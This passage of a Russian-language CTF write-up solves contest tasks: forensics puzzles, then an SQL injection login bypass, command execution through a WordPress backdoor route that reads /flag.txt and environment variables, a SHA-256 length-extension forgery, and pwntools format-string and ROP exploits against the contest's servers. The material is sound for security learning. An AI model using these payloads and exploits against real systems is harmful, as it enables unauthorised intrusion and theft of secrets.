## 3. Can you hear the flag?

### Условие

![Task Description](/ico_qualifying_round/tasks/can_you_hear_the_flag.webp)

```text
Just a picture. Nothing to see here.
```

Название говорит “hear”, а описание говорит “picture”. Это намек, что картинка может скрывать аудио.

### Шаги

```bash
file file-a.jpg
strings -a file-a.jpg | grep -iE 'ico|flag|ctf|wav|sound|audio|hint'
binwalk file-a.jpg
binwalk -e file-a.jpg
```

`binwalk` ищет файлы внутри файлов. Если в JPEG спрятан WAV, он это найдет.

После извлечения аудио я сделал спектрограмму:

```bash
ffmpeg -i hidden.wav -lavfi showspectrumpic=s=1600x900 spectrogram.png
```

Или:

```bash
sox hidden.wav -n spectrogram -o spectrogram.png
```

`Spectrogram` - картинка звука. По горизонтали время, по вертикали частота, яркость показывает силу сигнала. На ней был виден флаг.

### Флаг

```text
ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}
```

---

## 4. Five Shards

### Условие

![Task Description](/ico_qualifying_round/tasks/five_shards.webp)

```text
The flag was shattered across five files. Each shard is a piece of a larger puzzle - but not every file is what it seems, and not every secret is obvious.
Find them all. Put them together.
```

Файлы:

```text
corrupted.wav
noise.png
photo.jpg
readme.txt
traffic.pcap
```

### Типы файлов

```bash
file corrupted.wav noise.png photo.jpg readme.txt traffic.pcap
```

Вывод показал, что `corrupted.wav` выглядит как Java class, хотя должен быть WAV.

### README

```bash
echo 'Tm90aGluZyB0byBzZWUgaGVyZS4gVGhpcyBpcyBhIHJlZCBoZXJyaW5nLgpUaGUgZmxhZyBpcyBub3QgaW4gdGhpcyBmaWxlLgpIaW50OiBmaXZlIGZpbGVzLCBmaXZlIHNoYXJkcywgb25lIHRydXRoLg==' | base64 -d
```

Вывод:

```text
Nothing to see here. This is a red herring.
The flag is not in this file.
Hint: five files, five shards, one truth.
```

### WAV

```bash
xxd -l 32 corrupted.wav
```

Было:

```text
ca fe ba be de ad c0 de 52 49 46 46 34 b1 02 00
57 41 56 45 66 6d 74 20
```

`52 49 46 46` - это `RIFF`, настоящий WAV. Первые 8 байт мусорные:

```bash
tail -c +9 corrupted.wav > fixed.wav
file fixed.wav
```

### Фото

```bash
exiftool photo.jpg
```

Подсказки:

```text
The 13th step reveals the truth
GPS: 43°20'59.640"N, 42°26'43.080"E
Altitude: 5642m
```

Высота и координаты указывали на Эльбрус. “13th step” намекал на ROT13.

### PCAP

```bash
tshark -r traffic.pcap -Y dns -T fields -e dns.qry.name | sort -u
```

DNS-части:

```text
000-UOO5LRPL.shard4.ctf
001-YX2KZLWL.shard4.ctf
002-4WFKZHU7.shard4.ctf
003-XT4YVTUN.shard4.ctf
004-VTZLJ3VN.shard4.ctf
005-ZXHNN3O7.shard4.ctf
006-4GRQ====.shard4.ctf
```

Склеил и декодировал Base32:

```python
import base64

s = "UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ===="
print(base64.b32decode(s).hex())
```

### noise.png

```bash
zsteg -a noise.png
```

Важная строка:

```text
b4,g,lsb,xy .. file: zlib compressed data
```

Извлечение:

```bash
zsteg -E b4,g,lsb,xy noise.png > noise_shard.zlib
python3 - <<'PY'
import zlib
raw = open("noise_shard.zlib", "rb").read()
print(zlib.decompress(raw))
PY
```

После сборки частей получился флаг:

```text
ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}
```

---

## 5. NorthStar

### Условие

![Task Description](/ico_qualifying_round/tasks/northstar.webp)

```text
For years, Northstar Systems guided critical deployments across the globe. After a sudden breach locked the operations center, the company’s internal portal was taken offline. Rumors suggest the attackers left two flags behind: one buried in the authentication system, and another hidden within the deployment infrastructure.
https://task1.cyberolympiad.kz
```

Фраза “authentication system” намекала на login.

### SQL injection

Payload:

```text
username=' OR 1=1-- -
password=x
```

Уязвимый запрос мог быть таким:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

С payload он превращается в:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1-- -'
AND password = 'x';
```

`OR 1=1` всегда true, а `-- -` комментирует проверку пароля.

Проверка:

```bash
BASE='https://task1.cyberolympiad.kz'

curl -sk -i -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=x"
```

### Флаг

```text
ico{721427dd34030ef0c0458d1e5067395e}
```

---

## 6. Backdoor

### Условие

![Task Description](/ico_qualifying_round/tasks/backdoor.webp)

```text
Once a thriving community blog, this WordPress site was abandoned after its administrator vanished without a trace. The site remains online, filled with forgotten posts and an oddly persistent plugin installed by the last person to access the dashboard.
Explore the site, uncover its weaknesses, and find the flags hidden behind the administrator’s account and on the system.
https://task2.cyberolympiad.kz
```

Это WordPress. Подсказка “persistent plugin” говорит искать плагины, custom REST routes и `mu-plugins`.

### REST API

```bash
BASE='https://task2.cyberolympiad.kz'

curl -sk "$BASE/wp-json/" | python3 -m json.tool
curl -sk "$BASE/wp-json/wp/v2/users" | python3 -m json.tool
```

Нашел пользователя:

```text
sp3c1al
```

И маршрут:

```text
/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c
```

### RCE

Маршрут принимал JSON:

```json
{"c":"BASE64_COMMAND_HERE"}
```

Функция:

```bash
BASE='https://task2.cyberolympiad.kz'
ROUTE='/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c'

run_cmd() {
  cmd="$1"
  b64="$(printf '%s' "$cmd" | base64 -w0)"
  curl -sk -X POST "$BASE$ROUTE" \
    -H 'Content-Type: application/json' \
    -d "{\"c\":\"$b64\"}"
}
```

Проверка:

```bash
run_cmd 'id'
```

Флаг с системы:

```bash
run_cmd 'cat /flag.txt'
```

```text
ico{7519ee9f05a6a11ca96cc044c971b6ae}
```

Дополнительный флаг:

```bash
run_cmd 'find /var/www/html -maxdepth 4 -type f -name "*.php" 2>/dev/null | grep -Ei "mu-plugins|flag|shell|plugin"'
run_cmd "tr '\0' '\n' < /proc/self/environ | grep -E 'FLAG|USER_FLAG|ico'"
```

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 7. PixelMart

### Условие

![Task Description](/ico_qualifying_round/tasks/pixelmart.webp)

```text
The online store "PixelMart" gives out bonus codes using its own random generator and prides itself on its integrity.
Join us and see if it's really that hard to predict.
nc 94.131.84.228 33007
```

Это PRNG-задача. Нужно было предсказать генератор бонус-кодов.

Дано:

```text
m = 4294967296
hidden_bits = 16
x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828
rounds = 20
```

LCG:

```text
x[n+1] = (a * x[n] + c) mod m
```

У `x2` были скрыты нижние 16 бит, значит всего `65536` вариантов.

### Скрипт

```python
m = 2**32
hidden_bits = 16

x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828


def next_value(x, a, c):
    return (a * x + c) % m


for lower in range(1 << hidden_bits):
    x2 = (x2_top << hidden_bits) | lower

    try:
        a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
    except ValueError:
        continue

    c = (x1 - a * x0) % m

    if next_value(x2, a, c) == x3:
        print("lower =", lower)
        print("x2 =", x2)
        print("a =", a)
        print("c =", c)
        break
```

Результат:

```text
lower = 32441
x2 = 3591405241
a = 274874657
c = 646369019
```

Предсказания:

```text
900430671
3224290090
573546853
3209642496
864047355
246872662
3063474705
774720556
2207042727
2744227714
1401379005
282803288
2529947219
3390675630
3400920425
3950252676
1337505279
4012508122
3210717205
3281178288
```

### Флаг

```text
ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}
```

---

## 8. VIP Club

### Условие

![Task Description](/ico_qualifying_round/tasks/vip_club.webp)

```text
A private club issues guest passes based on a secret known only to them. You've been given a standard guest pass - enter as an admin.
nc 94.131.84.228 33006
```

Сервис дал:

```text
data0 = 757365723d6775657374266c6576656c3d6261736963
token0 = e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a
```

Декод:

```python
data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
print(data0)
```

```text
b'user=guest&level=basic'
```

Уязвимость - SHA-256 length extension:

```text
token = sha256(secret || message)
```

Если известны `message`, `token` и длина `secret`, можно добавить данные и получить новый валидный token.

Я добавил:

```text
&level=admin
```

Forged data:

```text
757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e
```

Forged token:

```text
a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20
```

`0140` в padding - это 320 бит, то есть 40 байт. Оригинал был 22 байта, значит длина секрета 18 байт.

Финальная команда:

```bash
printf "S 757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20\n" | nc 94.131.84.228 33006
```

`S` - команда submit. Первый hex - поддельные data, второй hex - поддельный token. После этого сервис принял admin-pass и выдал флаг.

---

## 9. Journal Operator

### Условие

![Task Description](/ico_qualifying_round/tasks/journal_operator.webp)

```text
The program keeps a transaction log. Regular users are not allowed to use it - the service itself informs them of this upon login.
nc 94.131.84.228 33102
```

Это pwn-задача на format string.

Опасно:

```c
printf(user_input);
```

Безопасно:

```c
printf("%s", user_input);
```

Если ввод идет прямо в `printf`, я могу использовать `%n`, чтобы записать число в память.

Адрес `is_admin`:

```text
0x40407c
```

### Эксплойт

```python
from pwn import *

context.arch = "amd64"

HOST = "94.131.84.228"
PORT = 33102
IS_ADMIN = 0x40407c

io = remote(HOST, PORT)
io.recvuntil(b"> ")

payload = fmtstr_payload(6, {IS_ADMIN: 1}, write_size="byte")
print(payload.hex())

io.sendline(payload)
io.interactive()
```

`fmtstr_payload` сам собирает format-string payload. `6` - offset на стеке. `{IS_ADMIN: 1}` значит записать `1` по адресу `0x40407c`.

Вывод:

```text
is_admin = 1
Доступ администратора подтверждён. ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

### Флаг

```text
ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

---

## 10. AEZAKMI

### Условие

![Task Description](/ico_qualifying_round/tasks/aezakmi.webp)

```text
An old arcade machine is asking for a name for its high score table.
nc 94.131.84.228 33101
```

Это stack buffer overflow + ROP. `AEZAKMI` - отсылка к чит-коду GTA. В бинарнике был magic:

```text
0x1337c0de
```

В Linux x86-64 первый аргумент функции кладется в `rdi`. Поэтому мне нужно вызвать:

```text
win(0x1337c0de)
```

Адреса:

```text
OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de
```

### Эксплойт

```python
from pwn import *

HOST = "94.131.84.228"
PORT = 33101

OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de

payload = b"A" * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(MAGIC)
payload += p64(WIN)

io = remote(HOST, PORT)
io.recvuntil("Введите имя".encode())
io.sendline(payload)
io.interactive()
```

Payload:

```text
'A' * 0x48
RET
POP_RDI
0x1337c0de
WIN
```

Сначала я заполняю буфер до return address, потом ставлю `rdi = 0x1337c0de`, потом прыгаю в `WIN`.

Вывод:

```text
Верный чит-код! ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

### Флаг

```text
ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

<p align="center"><a href="#ico-2027-qualifications-ctf-writeups">Наверх</a></p>
